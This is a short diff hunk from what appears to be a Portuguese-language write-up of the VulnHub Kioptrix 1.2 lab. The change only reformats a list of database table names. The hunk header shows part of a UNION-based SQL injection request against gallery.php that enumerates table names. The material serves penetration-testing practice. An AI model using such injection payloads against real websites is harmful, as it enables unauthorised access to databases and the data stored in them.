@@ -140,7 +140,9 @@ GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(TABLE_NAME),3,4,5,6+F
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql4.png)
 
-dev_accounts,gallarific_comments,gallarific_galleries,gallarific_photos,gallarific_settings,gallarific_stats,gallarific_users
+dev_accounts,gallarific_comments,gallarific_galleries,gallarific_photos
+
+gallarific_settings,gallarific_stats,gallarific_users
 
 Vamos extrair primeiro informações da Gallery
 
